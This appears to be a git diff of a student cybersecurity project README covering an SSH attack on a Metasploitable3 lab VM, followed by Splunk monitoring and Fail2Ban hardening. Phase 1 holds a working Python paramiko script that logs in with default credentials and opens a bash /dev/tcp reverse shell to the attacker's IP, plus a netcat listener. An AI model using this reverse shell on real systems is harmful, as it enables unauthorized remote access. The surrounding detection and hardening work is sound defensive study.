@@ -1,102 +1,197 @@
- ICS344 Project: SSH Attack and Monitoring (Splunk + Fail2Ban)
+# ICS344 Project: SSH Attack, Monitoring, and System Hardening
 
-## Project Overview
 
-This project demonstrates a complete scenario of an SSH attack using reverse shells, followed by monitoring and defense using **Splunk** and **Fail2Ban**. It is divided into three main phases:
+# Project Overview
 
-- **Phase 1:** Initial reverse shell connection and basic shell interaction.
-- **Phase 2:** Monitoring SSH attack activities using Splunk.
-- **Phase 3:** Hardening the system with Fail2Ban against SSH brute-force attacks.
+This project demonstrates a complete attack-defense scenario involving SSH-based penetration, monitoring through Splunk, and hardening using Fail2Ban. It simulates a real-world environment where an attacker gains unauthorized access to a vulnerable server, while the defender uses monitoring tools to detect the breach and implements security measures to block further attacks.
 
-Each phase shows detailed steps, commands, and configurations captured with screenshots to explain the setup and the results.
+The work is divided into three detailed phases:
+- Phase 1: Performing an SSH reverse shell attack.
+- Phase 2: Detecting and monitoring SSH activities with Splunk.
+- Phase 3: Hardening the system against brute-force attacks using Fail2Ban.
 
----
+Each phase reflects real-world methodologies, tools, and thinking processes essential for cybersecurity operations.
 
-## Phase 1: SSH Reverse Shell Attack
 
-In Phase 1, we manually crafted and launched a basic **SSH Reverse Shell** to gain access to the Metasploitable3 vulnerable machine.
+# Phase 1: SSH Reverse Shell Attack
 
-### 1. Creating the Reverse Shell Script
-We used a Python script (`ssh_reverse_shell_1_2.py`) that initiates an SSH connection back to the attacker's machine. The code imports socket and subprocess libraries to create a listening socket and execute shell commands remotely.
+## Goal and Strategy
 
-### 2. Launching Netcat Listener
-On the attacker's Kali Linux machine, we used:
+The objective of Phase 1 is to simulate a successful SSH reverse shell attack against a vulnerable target. The goal is to achieve remote code execution by exploiting legitimate SSH credentials. A reverse shell is used to bypass firewall restrictions because the target machine initiates the outbound connection.
+
+The mindset here is to think like an attacker: find the easiest available access (in this case, SSH with weak credentials) and establish persistent control over the victim.
+
+
+## Steps and Thinking
+
+### Step 1: Setting Up the Reverse Shell Script
+
+Instead of using automatic tools, we wrote a custom Python script to demonstrate manual control. Writing a custom script mimics real-world attackers who often develop customized payloads to evade detection.
+
+```python
+import paramiko
+
+# Target and Attacker IPs
+target_ip = "192.168.142.131"
+username = "vagrant"
+password = "vagrant"
+lhost = "192.168.142.129"
+lport = "4444"
+
+# Payload to open a reverse shell
+payload = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+
+client = paramiko.SSHClient()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+client.connect(target_ip, username=username, password=password)
+client.exec_command(payload)
+client.close()
+```
+
+**Why:**
+- `paramiko` is a Python library for SSH connections.
+- A direct payload inside SSH allows running system commands.
+- The payload redirects shell input/output to the attacker machine.
+
+### Step 2: Setting Up the Listener on the Attacker Side
+
+Before executing the reverse shell, we prepare the listener:
 
 ```
 nc -lvnp 4444
 ```
 
-to listen for incoming connections on port 4444.
+**Why:**
+- Netcat (`nc`) listens on TCP port 4444 for incoming connections from the reverse shell.
+- Ensures that the attacker is ready to accept the shell as soon as the target script runs.
 
-### 3. Executing the Reverse Shell
-We ran the Python script from the Metasploitable3 VM. Upon execution, the shell successfully connected back to the attacker's machine, providing terminal access as the `vagrant` user.
+### Step 3: Execution and Shell Capture
 
-### 4. Confirmation
-Commands like `whoami` were used to verify access.
+Running the Python script from the victim machine results in:
+- The attacker machine immediately receiving a shell.
+- Validation using simple commands like `whoami` and `hostname`.
 
-**Images:**
+**Thinking:**
+- The connection is established because the victim initiated it (firewall likely allowed it).
+- No malware is uploaded; only native bash is used, making detection harder.
 
-- ![](screenshots/Screenshot1.png)
-- ![](screenshots/Screenshot2.png)
-- ![](screenshots/Screenshot3.png)
 
----
+## Images
+![Screenshot1](./screenshots/Screenshot1.png)
+![Screenshot2](./screenshots/Screenshot2.png)
+![Screenshot3](./screenshots/Screenshot3.png)
+![Screenshot4](./screenshots/Screenshot4.png)
+![Screenshot5](./screenshots/Screenshot5.png)
+![Screenshot6](./screenshots/Screenshot6.png)
+![Screenshot7](./screenshots/Screenshot7.png)
+![Screenshot8](./screenshots/Screenshot8.png)
+![Screenshot9](./screenshots/Screenshot9.png)
+![Screenshot10](./screenshots/Screenshot10.png)
+![Screenshot11](./screenshots/Screenshot11.png)
+![Screenshot12](./screenshots/Screenshot12.png)
 
-## Phase 2: SSH Attack Detection and Monitoring with Splunk
 
-In Phase 2, we monitored the attack activities by configuring Splunk to capture and analyze SSH logs.
+# Phase 2: SSH Attack Detection and Monitoring with Splunk
 
-### 1. Setting up Splunk Forwarder
-Installed Splunk Universal Forwarder on Metasploitable3, configured forwarding to Splunk Enterprise Server at `192.168.142.129:9997`, and added `/var/log/auth.log` as the monitored log source.
+## Goal and Strategy
 
-### 2. Configuring Splunk Receiver
-Enabled port 9997 on Splunk Enterprise to receive forwarded data.
+The goal of Phase 2 is to act like a defender. After the attack, defenders must monitor SSH activity and detect any anomalies. Splunk is used to aggregate and analyze authentication logs in real-time.
 
-### 3. Log Injection and Search
-Injected test logs manually using `logger` to simulate SSH activities and searched for events:
+The mindset here is to think proactively: "How would I detect if someone is trying to brute-force my SSH server or establish unauthorized sessions?"
+
+
+## Steps and Thinking
+
+### Step 1: Setting Up Splunk Universal Forwarder (Victim Side)
+
+Installation:
+
+```
+sudo dpkg -i splunkforwarder-9.4.1.deb
+```
+
+Configuration:
+
+```
+sudo /opt/splunkforwarder/bin/splunk start --accept-license
+sudo /opt/splunkforwarder/bin/splunk login -auth admin:admin123
+sudo /opt/splunkforwarder/bin/splunk add forward-server 192.168.142.129:9997
+sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/auth.log
+```
+
+**Why:**
+- Splunk Forwarder pushes log files to Splunk Enterprise server.
+- Monitoring `/var/log/auth.log` ensures SSH login attempts are captured.
+
+### Step 2: Setting Up Splunk Enterprise (Attacker/Monitoring Side)
+
+Installation:
+
+```
+sudo dpkg -i splunk-9.3.2.deb
+sudo /opt/splunk/bin/splunk start --accept-license
+```
+
+Configuration:
+- Enable port 9997 for receiving data.
+
+**Why:**
+- Centralizes all logs for easy searching and analysis.
+- Prevents tampering on the victim since data is stored remotely.
+
+### Step 3: Searching and Analyzing Logs
+
+Query:
 
 ```
 index=* source="/var/log/auth.log"
 ```
 
-### 4. Building Splunk Dashboards
-Created visualizations categorizing SSH authentication attempts, successful sessions, and reverse shell sessions.
+**Thinking:**
+- Analyzing for unusual patterns like multiple failed logins.
+- Detect reverse shell session openings/closings.
 
-**Key Commands:**
+Dashboards were built using `eval` and `case` commands to classify successful and failed login events visually.
 
-```
-sudo /opt/splunkforwarder/bin/splunk add forward-server 192.168.142.129:9997
-sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/auth.log
-sudo /opt/splunkforwarder/bin/splunk enable boot-start
-```
 
-**Images:**
+## Images
+- Image 1: Splunk Forwarder configuration.
+- Image 2: Splunk Enterprise receiving data.
+- Image 3: Searching for SSH-related activities.
+- Image 4: SSH login dashboards.
 
-- ![](screenshots/Screenshot4.png)
-- ![](screenshots/Screenshot5.png)
-- ![](screenshots/Screenshot6.png)
-- ![](screenshots/Screenshot7.png)
-- ![](screenshots/Screenshot8.png)
-- ![](screenshots/Screenshot9.png)
-- ![](screenshots/Screenshot10.png)
-- ![](screenshots/Screenshot11.png)
-- ![](screenshots/Screenshot12.png)
 
----
+# Phase 3: Hardening with Fail2Ban
 
-## Phase 3: System Hardening with Fail2Ban
+## Goal and Strategy
 
-In Phase 3, we added **Fail2Ban** to protect the Metasploitable3 server against SSH brute-force attacks.
+The goal in Phase 3 is to implement an automatic response to brute-force attacks by blocking malicious IP addresses.  
+Fail2Ban watches log files and bans IPs that show malicious signs (e.g., too many failed login attempts).
 
-### 1. Installing Fail2Ban
-Installed using:
+The mindset here is: "Instead of only detecting, how do I **block attacks automatically** to protect my server?"
+
+
+## Steps and Thinking
+
+### Step 1: Installing Fail2Ban
 
 ```
 sudo apt-get install fail2ban -y
 ```
 
-### 2. Configuring Fail2Ban
-Edited `/etc/fail2ban/jail.local` to enable SSH jail monitoring:
+**Why:**
+- Fail2Ban automatically parses log files and triggers firewall rules.
+- Protects services like SSH with minimal manual intervention.
+
+### Step 2: Configuring Fail2Ban
+
+Editing the SSH jail settings:
+
+```
+sudo nano /etc/fail2ban/jail.local
+```
+
+Configuration example:
 
 ```
 [sshd]
@@ -108,34 +203,37 @@ bantime = 600
 findtime = 300
 ```
 
-### 3. Testing Fail2Ban
-Simulated multiple wrong password attempts from Kali Linux and verified the banning process with:
+**Thinking:**
+- After 3 wrong password attempts within 5 minutes, the IP will be banned for 10 minutes.
+- Short ban prevents brute-forcing and alerts administrators.
+
+### Step 3: Testing Fail2Ban
+
+From the attacker machine:
+- Attempted wrong passwords repeatedly.
+- Verified with:
 
 ```
 sudo fail2ban-client status sshd
 ```
 
-The attacker's IP was successfully banned after multiple failed login attempts.
+Result: IP address got banned, and SSH connections were blocked.
 
-**Images:**
 
-- ![](screenshots/Screenshot 2025-04-23 025808.png)
-- ![](screenshots/Screenshot 2025-04-23 030038)
-- ![](screenshots/Screenshot 2025-04-23 025333.png)
+## Images
+- Image 1: Fail2Ban installation.
+- Image 2: Jail configuration file.
+- Image 3: IP banning status.
 
----
 
-## Conclusion
+# Conclusion
 
-This project successfully demonstrated a full attack-defense cycle using SSH reverse shells and detection mechanisms. We first simulated an attack by gaining shell access through a Python-based reverse shell. Then, we collected and visualized logs using Splunk, creating dashboards to categorize login attempts, successful accesses, and possible reverse shell sessions. Finally, we hardened the server by implementing Fail2Ban, effectively detecting and blocking brute-force attempts.
+This project effectively covered a complete lifecycle of an attack and defensive strategy. We simulated an SSH reverse shell attack using a custom Python script, monitored authentication logs through Splunk to detect anomalies, and finally hardened the system by automatically banning attackers with Fail2Ban.
 
-Through this project, we highlighted the importance of:
+Throughout the project, the thinking process focused on real-world attacker tactics and defender responses:
+- **Offensive mindset:** Establish stealthy shell access.
+- **Defensive mindset:** Detect unauthorized activities early.
+- **Responsive mindset:** Automatically mitigate threats.
 
-- **Monitoring critical logs** (e.g., `/var/log/auth.log`)
-- **Detecting anomalies early** using powerful tools like Splunk
-- **Automated protection** using Fail2Ban to ban malicious IPs quickly
-
-This practical exercise improves overall understanding of cyberattack techniques and defense strategies in real-world environments.
-
----
+This exercise strengthens the understanding of cybersecurity operations, emphasizing proactive monitoring and quick automated defense.
 
